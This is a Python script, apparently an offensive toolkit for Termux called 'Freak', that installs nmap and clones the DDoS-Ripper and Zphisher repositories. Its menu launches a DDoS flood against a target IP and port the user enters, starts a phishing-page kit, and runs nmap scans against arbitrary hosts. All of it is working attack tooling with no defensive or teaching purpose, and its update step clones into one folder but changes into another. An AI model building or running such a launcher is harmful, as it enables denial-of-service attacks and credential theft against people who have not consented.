import os
import time
import subprocess
import shutil
tools = {
    "nmap": {"type": "pkg", "package": "nmap"},
    "wget": {"type": "pkg", "package": "wget"},
    "git": {"type": "pkg", "package": "git"},
    "DDoS-Ripper": {
        "type": "git",
        "repo": "https://github.com/palahsu/DDoS-Ripper.git",
        "path": os.path.expanduser("~/DDoS-Ripper")
    },
    "Zphisher": {
        "type": "git",
        "repo": "https://github.com/htr-tech/zphisher.git",
        "path": os.path.expanduser("~/zphisher")
    }
}

def is_installed(command):
    return shutil.which(command) is not None

def install_pkg(package):
    print(f"[+] Installing {package} via pkg...")
    subprocess.run(["pkg", "install", "-y", package], check=True)

def clone_repo(name, repo_url, path):
    if os.path.isdir(path):
        print(f"[✓] {name} already exists at {path}")
    else:
        print(f"[+] Cloning {name} from {repo_url} to {path}...")
        subprocess.run(["git", "clone", repo_url, path], check=True)

def main():
    print("[*] Checking tools and installing if missing...\n")
    for name, info in tools.items():
        print(f"[?] Checking {name}...")
        if info["type"] == "pkg":
            if is_installed(info["package"]):
                print(f"[✓] {name} is already installed.")
            else:
                install_pkg(info["package"])
        elif info["type"] == "git":
            clone_repo(name, info["repo"], info["path"])
        else:
            print(f"[!] Unknown tool type for {name}")
    print("\n[✔] All tools are installed or available.")

if __name__ == "__main__":
    main()
os.system("git clone https://github.com/palahsu/DDoS-Ripper")
os.system("clear")
os.system("git clone https://github.com/htr-tech/zphisher")
os.system("clear")
while True:    
    os.system("clear")
    print("███████╗██████╗░███████╗░█████╗░██╗░░██╗")
    print("██╔════╝██╔══██╗██╔════╝██╔══██╗██║░██╔╝")
    print("█████╗░░██████╔╝█████╗░░███████║█████═╝░")
    print("██╔══╝░░██╔══██╗██╔══╝░░██╔══██║██╔═██╗░")
    print("██║░░░░░██║░░██║███████╗██║░░██║██║░╚██╗")
    print("╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝")
    print("                      TOOL MADE BY apexvr_ ON TIKTOK")
    print("")
    print("1. Nmap Scan")
    print("2. DDoS (DDoS Ripper)")
    print("3. Zphisher")
    print("98. Update dependencies")
    print("99. Update Freak")
    print("00. Exit")
    freakchoice = input(">>> ")
    if freakchoice == "98":
        packages_to_update = ["nmap", "wget", "python3", "python", "git"]
    
        print("\n[-] Checking and updating the following packages if new versions exist:")
        for pkg in packages_to_update:
            print(f"  - {pkg}")
            time.sleep(0.7)  
        try:
            print("\n[+] Updating package lists...")
            subprocess.run(["apt", "update"], check=True)
    
            print("[+] Upgrading selected packages...")
            for pkg in packages_to_update:
                print(f"  -> Upgrading {pkg} (if available)...")
                subprocess.run(["apt", "install", "--only-upgrade", "-y", pkg], check=True)
    
            print("\n[-] Update check complete. Packages are up to date.")
        except subprocess.CalledProcessError as e:
            print(f"[!] Error during update: {e}")
    elif freakchoice == "2":
        IPDDOS = input("TARGET IP: ")
        PORTDDOS = int(input("OPEN PORT: "))
        print("Press CTRL + C to break")
        time.sleep(2)
        os.system(f"python3 DRipper.py -s {IPDDOS} -p {PORTDDOS} -t 443")
    elif freakchoice == "1":
        IP = input("TARGET IP: ")
        METHOD = input("SCAN METHOD (sT, sS, Pn...): ")
        os.system(f"nmap -{METHOD} {IP}")
        time.sleep(5)
    elif freakchoice == "3":
        current_dir = os.getcwd()
        zphisher = os.path.join(current_dir, "zphisher")
        os.chdir(zphisher)
        os.system("chmod +x zphisher.sh")
        os.system("bash zphisher.sh")
        time.sleep(0.5)
        os.chdir(current_dir)
    elif freakchoice == "99":
        home = os.path.expanduser("~")
        repo_path = os.path.join(home, "FreakForLinux")
        if os.path.exists(repo_path):
            os.chdir(repo_path)
            subprocess.run(["git", "pull"])
            time.sleep(2)
        else:
            os.chdir(home)
            subprocess.run(["git", "clone", "https://github.com/Apex-Arch/FreakForTermux.git"])
            os.chdir(repo_path)
            subprocess.run(["python3", "Freak.py"])
            time.sleep(2)
    elif freakchoice == "00":
        print("[-] Exiting...")
        time.sleep(1)
        os.system("clear")
        break
    else:
        print("[!] invalid input!")
        
